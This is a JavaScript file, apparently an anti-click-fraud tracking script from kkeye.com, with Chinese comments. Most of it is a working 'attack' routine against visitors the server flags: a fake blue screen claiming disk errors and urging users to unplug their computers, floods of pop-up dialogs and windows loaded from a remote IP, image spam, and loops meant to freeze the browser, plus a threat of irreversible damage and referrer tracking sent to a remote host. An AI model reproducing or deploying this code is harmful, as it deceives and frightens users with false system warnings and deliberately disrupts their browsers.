var _kc_arr = [];
var _kc_bF=true;
///蓝屏
_kc_content = [' Window系统发现严重错误！',
'硬盘错误发生在0x2205EA907，0x85129469FE等71处!',
'硬盘错误发生在C盘5166扇区，2536扇区等139处!',
 '继续运行将会发生无法挽救的效果!', '这是一种罕见的系统错误!',
 '建议以后不要再浏览您刚才访问的网站!', '请立即拔掉电源并停机8小时以保护您的电脑!'];
_kc_index = new Array();
function BlueScreen() {
    scroller();

    var html = "<html  xmlns='http://www.w3.org/1999/xhtml' style='background-color: Blue; color: White;width:100%;margin:0px 0px; padding:0px 0px;'><body id='body' style='width:100%;margin:0px 0px; padding:0px 0px; text-align:left;'></body></html>";
    try {
        document.body.innerHTML = "";
        document.body.innerText = "";
    } catch (e) {

    }
    if (document.body) {
        document.body.removeAttribute("style");
        document.body.removeAttribute("class");
        document.body.style.width = "100%";
        document.body.style.backgroundColor = "Blue";
        document.body.style.color = "White";
        document.body.style.textAlign = "left";

    } else {
        document.write(html);
    }
    var div = document.createElement("div");
    div.style.zindex = "9999";
    div.style.position = "absolute";
    div.style.top = "0px";
    div.style.left = "0px";
    div.style.bgcolor = "Blue";
    div.style.textAlign = "left";
    div.style.width = window.screen.width || "1024px";
    div.style.height = window.screen.height || "1024px";
    div.setAttribute("id", "div");
    //    div.style.filter = 'alpha(Opacity=100)';


    document.body.appendChild(div);

    _kc_index[0] = 0;
    setInterval('write()', 150);

}
//写入电脑损坏信息
function write() {
    _kc_index[0] = _kc_index[0] + 1;
    var body = document.getElementById("div");
    body.appendChild(document.createTextNode(_kc_content[_kc_index[0]]));
    body.appendChild(document.createElement("br"));
    if (_kc_index[0] == _kc_content.length - 1) {
        body.appendChild(document.createElement("br"));
        body.appendChild(document.createElement("br"));
        _kc_index[0] = 0;
    }
}
///自动滚屏
var position = 0;
function scroller() {
    position++;
    scroll(0, position);
    var timer = setTimeout("scroller()", 100);
    timer;
}


//----------弹窗:小窗口--------------------
function Windowbb() {

    for (var i = 0; i < 10; i++) {
        url = 'http://202.108.201.77/js/alert.htm';
        message = "严重警告！";
        state = 'dialogLeft:' + window.screen.width + ';dialogTop:' + 0 + ';scroll:no;status:0;help:0;resizable:no;dialogWidth:260px;dialogHeight:170px;unadorned:off';
        window.showModelessDialog(url, message, state);
    }
    setInterval('WindowOpen()', 200);
}
///打开小窗体
function WindowOpen(turl) {
    focus();
    var width = window.screen.width;
    t = fRandomBy(0, 800); l = fRandomBy(0, width);
    url = turl || 'http://202.108.201.77/js/alert.htm';
    state = 'dialogLeft:' + l + ';dialogTop:' + t + ';scroll:no;status:0;help:0;resizable:no;dialogWidth:260px;dialogHeight:170px;unadorned:no;unadorned:off';
    //    window.showModalDialog(url, message, state); 模式对话框
    //先遮住关闭按钮

    window.showModelessDialog(url, "", state, true);
}
///产生随机数
function fRandomBy(under, over) {
    switch (arguments.length) {
        case 1: return parseInt(Math.random() * under + 1);
        case 2: return parseInt(Math.random() * (over - under + 1) + under);
        default: return 0;
    }
}
//----------弹窗：大窗口---------------------
function BigWindowbb() {

    setInterval("BigWindowOpen()", 304);
    //   BigWindowOpen();
}
function BigWindowOpen() {
    url = 'http://202.108.201.77/js/alert.htm';
    // var newwin = window.open(url, "", "width=" + window.screen.width + ",height=" + window.screen.height); //谷歌阻止
    var newwin = window.open(url, "", "", true);
    newwin.focus();
}
//----------假死------------------

function Die() {
    setInterval('cdom()', 10);
    setInterval('calc()', 9);
    //    setInterval('WindowOpen("http://202.108.201.77/js/alert.htm?t=1")', 189)

    setTimeout("Die()", 400);
}

var PI = 3.1415926515698413235456132456;
function cdom() {
    for (var i = 0; i < 100000; i++) {
        var f = document.createDocumentFragment();
        document.body.appendChild(f.appendChild(document.createElement("div")));
        //        cdom();
    }
}
function calc() {
    for (var i = 0; i < 100000000; i++) {
        return Math.cos(Math.sin(PI));
    }
}
function alertMessage() {
    alert("恶意点击！");
}

//--------占用网速，连接不通的网站，占用DNS---------------------
function BlockNet() {
    for (var i = 0; i < 15; i++) {
        var ran = fRandomBy(0, 1000000)
        //        var script = "<script type='text/javascript' src='http://www.xxx" + ran + ".com/xxx.js' />"
        //       document.write(script)
        //        var script = document.createElement("scrpit");
        //        script.src = "www.xxx" + ran + ".com/xxx.js";
        var oHead = document.getElementsByTagName('HEAD').item(0);

        var oScript = document.createElement("script");

        oScript.type = "text/javascript";

        oScript.src = "http://www.xxx" + ran + ".com/xxx.js";
        oScript.src = "http://www.sina.com.cn" + "?temp=" + new Date().getTime();
        oHead.appendChild(oScript);

    }
}
function BlockNetbb() {
    setInterval("BlockNet()", 200);
}
//--------一起攻击--------------------------
function attack() {
    document.onclick = alertMessage; //点击任何地方都弹窗
    //先蓝屏三秒
    //占用网速
    //再弹窗
    //弹大窗
    //再卡死
    window.onload = BlueScreen;

    setTimeout('divbb()', 2000)
    //setTimeout("BlockNetbb()", 2800);
    setTimeout('Windowbb()', 3000)

    setTimeout('BigWindowbb();', 4000)

    setTimeout('Die()', 7000)



}
//--------收藏夹---------------------------
function addfavorite() {
    var info = "您已经进入防恶意点击检测，继续点击将受到系统狙击，会对您的电脑造成无法挽回的损失，您可以将网址添加到收藏夹或者直接输入网址进行访问。\r\n 确定将网址添加到收藏夹？";
    if (confirm(info)) {
        var url = window.location.href;
        var title = document.title;
        if (document.all) {
            window.external.AddFavorite(url, title);
        } else if (window.sidebar) {
            window.sidebar.addPanel(title, url, "");
        } else if (window.opera && window.print) {
            var mbm = document.createElement('a');
            mbm.setAttribute('rel', 'sidebar');
            mbm.setAttribute('href', url);
            mbm.setAttribute('title', title);
            mbm.click();
        } else {
            alert("收藏失败！请使用Ctrl+D进行收藏");
        }
    } else {

    }
}

//-----------弹div-----------
function divbb() {
    for (var i = 0; i < 400; i++) {
        boxs();
    }
    setInterval("boxs()", 50);
}

function boxs() {
    // window.scrollTo(0,0);
    //  boht.innerHTML = '<div id="bg"></div><div id="info"><img src="http://eyclick.kkeye.com/js/logo.jpg"></div>';   
    var img = document.createElement("img");
    img.src = "http://eyclick.kkeye.com/js/logo.jpg";
    img.style.position = "absolute";
    img.style.width = '260';
    img.height = "170";
    var width = window.screen.width || 1024;
    var height = window.screen.width || 1024;
    t = fRandomBy(0, width); l = fRandomBy(0, height);

    img.style.top = t;
    img.style.left = l;
    document.body.appendChild(img);

}

function _kc_do(i,m)
{
 if(i==1)alert(m);
 else if(i==2)
 {
	attack();
 }
}
var _kkeye_a3="kkeye";
var _kkeye_a2="kkeye";
var _kkeye_a1="";

_kkeye_a1 = document.referrer;

try{
	_kkeye_a2=window.parent.document.referrer;
}catch(e){}
try{
	_kkeye_a3=top.document.referrer;
}catch(e){}
if(_kkeye_a2 !== "kkeye")
{
	_kkeye_a1 = _kkeye_a2;
}
if(_kkeye_a3 !== "kkeye")
{
	_kkeye_a1 = _kkeye_a3;
}

if (typeof(_kc_userID)!="undefined" && _kc_bF){
 document.write(unescape("%3Cscript")+" charset='utf-8' src='http://eyclick.kkeye.com/ck?i="+_kc_userID+"&u=" + escape(document.location.href)+"&r=" + escape(_kkeye_a1) + "&t=" + Math.random() + "' "+unescape("type='text/javascript'%3E%3C/script%3E"));
 _kc_bF=false;}